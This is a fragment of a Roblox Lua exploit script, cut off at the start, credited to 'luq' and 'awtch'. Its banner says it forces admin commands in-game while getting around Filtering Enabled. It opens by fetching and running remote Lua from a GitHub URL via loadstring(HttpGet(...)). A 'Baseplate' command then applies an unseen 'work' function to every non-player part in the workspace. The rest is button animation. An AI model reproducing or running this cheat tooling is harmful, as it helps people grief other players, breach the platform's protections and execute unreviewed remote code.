loadstring(game:HttpGet("https://raw.githubusercontent.com/itzyaboyluq/destructedhex/main/explorer.lua"))()
end)

AddCommand("Baseplate", function()
if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local hrp = hum.RootPart
	if not hrp then return end
	local params = RaycastParams.new()
	params.FilterDescendantsInstances = {char}
	params.FilterType = Enum.RaycastFilterType.Exclude
	params.IgnoreWater = true
	local rc = workspace:Raycast(hrp.Position, hrp.CFrame.UpVector*-10, params)
	
	for i,v in pairs(workspace:GetChildren()) do
		if game:service'Players':GetPlayerFromCharacter(v) then continue end
		for _,instance in pairs({v, table.unpack(v:GetDescendants())}) do
			if not (instance:IsA("BasePart")) then continue end
			if (rc and rc.Instance == instance) or instance.Size.Magnitude >= 1000 or instance.Name:lower():gsub(" ",""):find("baseplate") then continue end
			work(instance)
		end
	end
end)

for _,btn in pairs(scripts:GetDescendants()) do 
if btn:IsA("TextButton") then
btn.MouseButton1Click:Connect(function()
	game:GetService("TweenService"):Create(btn, TweenInfo.new(0.2), {
		['BackgroundColor3'] = Color3.fromRGB(70, 70, 70);
		['TextColor3'] = Color3.fromRGB(170, 170, 170);
	}):Play();
	wait(0.2)
	game:GetService("TweenService"):Create(btn, TweenInfo.new(0.2), {
		['BackgroundColor3'] = Color3.fromRGB(53, 53, 53);
		['TextColor3'] = Color3.fromRGB(255, 255, 255);
	}):Play();
end)
end
end

text.Text = "Script: 011_luq & UI: awtch\nForce admin commands in-game without needing to worry about Filtering Enabled\nUse the internal GUI to execute commands\nVersion: "..version.."\nCommands: "..count

end
end

-- GUI, Scripts/Commands by Luca and luq.